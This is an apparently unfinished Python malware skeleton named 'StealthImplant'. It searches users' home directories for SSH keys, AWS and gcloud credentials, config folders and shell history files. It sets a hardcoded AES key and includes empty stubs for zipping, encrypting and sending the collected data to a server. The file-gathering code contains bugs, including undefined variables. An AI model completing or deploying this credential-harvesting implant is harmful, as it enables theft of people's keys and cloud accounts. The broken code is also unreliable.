from pathlib import Path
import zipfile

class StealthImplant:
    
    # we scan from "source"
    # we look for file matching "target"
    def __init__(
        self, 
        source="/home/",
        target_patterns=[
            ".ssh", 
            ".config", 
            ".aws", 
            ".gcloud",
        ],
        history_glob=".*_history",
        test=False
    ):
        if test:
            print("Implant initialize")
            print("source", source)
            print("target", target)

        self.root_dir=Path(source)
        self.target_patterns=target_patterns
        self.history_glob=history_glob
        self.test=test
        self.ignore_dirs = {"lost+found", "cache", "tmp" }
        self.encryption_key = b'16bytessecretkey'  # AES-128
        self.encryption_iv = b'16bytepubliciv!'
    
    def run(self):
        try:
            collected_files=self.walk_dir()
        except Exception as e:
            if self.test:
                raise

    # get list of file from source
    # matching target
    def walk_dir(self):
        target = [] 
        for user_dir in self.root_dir.iterdir():
            if user_dir.name in self.ignore_dirs:
                continue
            for pattern in self.target_patterns:
                for file_path in user_dir.rglob(pattern): 
                    print("found", file_path)
        return targets

        
    # zip the files we found
    def zipfile(self):
        pass
    
    # encrypt the data
    def encrypt(self):
        pass

    # send to server
    def send_to_server(self):
        pass

def main():
    implant = StealthImplant(source="test_data", target_patterns=[".txt"])
    implant.run()

if __name__ == "__main__":
    main()





